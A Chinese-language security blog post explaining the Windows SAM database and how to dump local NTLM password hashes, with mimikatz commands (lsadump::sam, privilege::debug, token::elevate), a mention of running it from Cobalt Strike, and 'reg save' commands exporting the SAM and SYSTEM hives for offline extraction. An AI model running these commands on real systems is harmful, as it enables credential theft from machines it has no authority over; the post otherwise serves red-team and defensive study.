---
title: SAM文件抓取密码
description: SAM文件抓取密码
pubDate: 01 19 2025
image: https://img.trtyr.top/images/blog/SAM%E6%96%87%E4%BB%B6%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81/002%20SAM%E6%96%87%E4%BB%B6%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81-5.webp
categories:
  - 网络安全
tags:
  - 密码抓取
  - 其他
---

## SAM 文件介绍

`SAM` 文件，全称 `Security Account Manager`（安全帐户管理器），是 **Windows 操作系统中用来存储本地用户帐户和组的安全数据库**。它是一个注册表文件，位于 `%SystemRoot%\system32\config\SAM`。其主要作用是**存储本地用户和组信息**，并**验证用户身份**。

`SAM` 文件包含所有本地用户帐户的用户名、**密码哈希值**（`NTLM` 或 `Kerberos`）、组关系以及其他相关信息，例如用户描述、上次登录时间等。它还为每个用户和组分配唯一的**安全标识符 (SID)**，用于在系统中标识和管理用户的访问权限。此外，它还支持**密码策略**，例如密码长度、复杂性要求等。

需要注意的是，`SAM` 文件并不直接存储用户的明文密码，而是存储**密码的哈希值**。哈希函数是一种单向加密算法，可以将密码转换为固定长度的字符串，并且无法从哈希值逆向推导出原始密码。这提高了密码的安全性。

`SAM` 文件受到 `Windows` 操作系统的严格保护，只有具有管理员权限的用户才能访问它。此外，`SAM` 文件在运行时会被系统锁定，防止未经授权的访问和修改。

由于 `SAM` 文件包含敏感的用户凭据信息，因此它是攻击者经常攻击的目标。攻击者可以通过各种方式尝试获取 SAM 文件，并使用密码破解工具来尝试破解哈希值并获取用户密码。对于加入域的计算机，用户帐户和组信息通常存储在 `Active Directory` 域控制器中，而不是本地的 SAM 文件中。在这种情况下，本地的 `SAM` 文件仅用于存储本地管理员帐户等少数本地帐户。

## Mimikatz

使用 `minikazt` 进行查看

```
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
mimikatz.exe "log res.txt" "privilege::debug" "lsadump::sam" "exit"
```

![](https://img.trtyr.top/images/blog/SAM%E6%96%87%E4%BB%B6%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81/002%20SAM%E6%96%87%E4%BB%B6%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81-1.webp)

或者 CS 上能直接跑

![](https://img.trtyr.top/images/blog/SAM%E6%96%87%E4%BB%B6%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81/002%20SAM%E6%96%87%E4%BB%B6%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81-2.webp)

## 离线读取

### 文件说明

这里有三个文件

- `sam.hiv`
- `system.hiv`
- `security.hiv`

在 Windows 注册表中，`hive`（蜂巢）是一个逻辑上的注册表键、子键和值的集合，它拥有一个对应的文件，其中包含支持该 `hive` 的数据备份。简单来说，你可以把 `hive` 文件理解为注册表的一部分，它将注册表数据以文件的形式存储在磁盘上。这些文件通常没有扩展名或者以 `.hiv` 作为扩展名。

- `sam.hiv`
  - `sam.hiv` 文件就是我们之前详细讨论过的 `SAM` 的 `hive` 文件。
  - 它存储了**本地用户帐户和组的安全信息**，包括用户名、密码哈希值 (`NTLM` 或 `Kerberos`)、SID 等。
  - 在用户登录时，系统会使用此文件来验证用户的身份。
  - 文件路径通常是：`%SystemRoot%\system32\config\sam` (或 `sam.hiv`)
- `system.hiv`
  - `system.hiv` 文件包含了**系统范围的配置信息**，这些信息对系统的启动和运行至关重要。
  - 它存储了硬件配置、已安装的驱动程序、服务配置、启动参数以及系统控制设置等信息。
  - 这个文件对于系统的稳定性和功能至关重要。
  - 文件路径通常是：`%SystemRoot%\system32\config\system` (或 `system.hiv`)
- `security.hiv`
  - `security.hiv` 文件存储了**本地安全策略设置**。
  - 这些设置包括密码策略（如密码长度和复杂性）、帐户锁定策略、审核策略、用户权限分配以及各种安全选项。
  - 这些策略定义了系统的安全行为和访问控制规则。
  - 文件路径通常是：`%SystemRoot%\system32\config\security` (或 `security.hiv`)

`sam`文件保存了用户凭据，`system`文件则保存了能够解密`sam`文件内容的`syskey`。因此我们需要同时导出两个文件。

### 导出 hive 文件

```shell
reg save HKLM\SAM SAM.hiv
reg save HKLM\SYSTEM SYSTEM.hiv
```

![](https://img.trtyr.top/images/blog/SAM%E6%96%87%E4%BB%B6%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81/002%20SAM%E6%96%87%E4%BB%B6%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81-3.webp)

然后用 `minikatz` 去读取 `SAM` 中的 `NTLM`

```
mimikatz.exe "lsadump::sam /sam:sam.hive /system:system.hive" "exit"
```

![](https://img.trtyr.top/images/blog/SAM%E6%96%87%E4%BB%B6%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81/002%20SAM%E6%96%87%E4%BB%B6%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81-4.webp)
